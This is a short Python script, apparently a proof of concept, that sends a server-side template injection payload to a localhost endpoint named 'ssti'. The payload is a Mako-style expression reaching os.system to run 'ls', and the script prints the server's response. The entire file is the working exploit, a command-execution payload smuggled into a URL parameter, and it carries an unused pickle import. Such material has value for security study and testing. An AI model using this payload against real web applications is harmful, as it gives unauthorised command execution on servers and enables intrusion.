import requests
import pickle

url = 'http://localhost:8080/ssti?name=${self.module.cache.util.os.system("ls")}'
response = requests.get(url)
print(response.text)